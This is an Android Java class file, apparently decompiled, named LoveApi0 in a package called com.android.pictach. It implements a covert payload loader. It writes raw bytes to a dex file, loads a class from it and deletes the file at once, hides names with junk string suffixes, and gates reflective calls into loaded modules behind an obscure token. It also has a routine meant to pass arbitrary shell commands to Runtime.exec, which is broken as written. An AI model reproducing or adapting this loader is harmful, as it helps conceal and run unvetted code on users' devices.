package com.android.pictach;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Environment;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Iterator;

public class LoveApi0 {

    
    public static int dexFileCounter;

    
    public static boolean isServiceNotRunning(Class<?> serviceClass, Context context) {
        Iterator<ActivityManager.RunningServiceInfo> it =
                ((ActivityManager) context.getSystemService("activity"))
                        .getRunningServices(Integer.MAX_VALUE)
                        .iterator();
        while (it.hasNext()) {
            if (serviceClass.getName().equals(it.next().service.getClassName())) {
                return false; 
            }
        }
        return true; 
    }

    
    public static File getModuleStorageDir(Context context) {
        File dir = new File(context.getFilesDir(), Config.FTX0);
        if (!dir.exists()) {
            dir.mkdirs();
        }
        return dir;
    }

    
    public static synchronized Class<?> loadDexModule(Object[] objArr) {
        File dexFile;
        synchronized (LoveApi0.class) {
            Context context   = (Context) objArr[0];
            byte[] dexBytes   = (byte[])  objArr[1];
            
            String className  = ((String)  objArr[2]) + "STOP";
            
            String optDirName = ((String)  objArr[3]) + "XTYVCX";

            File storageDir = getModuleStorageDir(context);
            if (!storageDir.exists()) {
                storageDir.mkdir();
            }

            
            try {
                dexFile = new File(storageDir, buildTempFileName(Config.FTX3, "$$", dexFileCounter));
                dexFileCounter++;
                FileOutputStream fos = new FileOutputStream(dexFile);
                fos.write(dexBytes, 0, dexBytes.length);
                fos.flush();
                fos.close();
            } catch (Exception unused) {
                dexFile = null;
            }

            if (dexFile != null) {
                try {
                    
                    DexClassLoader loader = new DexClassLoader(
                            dexFile.getPath(),
                            context.getDir(optDirName.replace("XTYVCX", ""), 0).getAbsolutePath(),
                            null,
                            context.getClass().getClassLoader()
                    );
                    
                    dexFile.delete();
                    
                    return loader.loadClass(className.replace("STOP", ""));
                } catch (Exception unused2) {
                }
            }
            return null;
        }
    }

    
    private static String buildTempFileName(String prefix, String marker, int counter) {
        if (marker.length() > 2) {
            return prefix + counter;
        }
        return (prefix + counter + marker).replace("$$", "");
    }

    
    public static Object invokeModuleMethod(String authToken, Object[] objArr) {
        Context context    = (Context) objArr[0];
        Class   moduleClass = (Class)   objArr[1];
        
        String methodName  = ((String)  objArr[2]) + "FB0TS";
        
        String strArg      = ((String)  objArr[3]) + "XXTB";
        byte[] dataArg     = (byte[])   objArr[4];
        String authToken2  = objArr.length > 5 ? (String) objArr[5] : authToken;

        
        if (moduleClass != null && authToken.equals("ʼʾʿˈᵔঙʿ$ʿʼ")) {
            try {
                return moduleClass
                        .getDeclaredMethod(
                                methodName.replace("FB0TS", ""),
                                Context.class,
                                String.class,
                                byte[].class
                        )
                        .invoke(
                                moduleClass.newInstance(),
                                context,
                                strArg.replace("XXTB", ""),
                                dataArg
                        );
            } catch (Exception unused) {
            }
        }
        return null;
    }

    
    public static void runShellOnModuleDir(Object[] objArr) {
        Context context = (Context) objArr[0];
        String  command = (String)  objArr[1];
        File    dir     = getModuleStorageDir(context);
        if (dir.isDirectory()) {
            try {
                Runtime rt = getRuntime("EXBbFT$");
                if (rt != null) {
                    rt.exec(command + dir.getPath());
                }
            } catch (Exception unused) {
            }
        }
    }

    
    private static Runtime getRuntime(String str) {
        try {
            if (str.length() <= 0) {
                return null;
            }
            Runtime.getRuntime(); 
            return null;
        } catch (Exception unused) {
            return null;
        }
    }
}
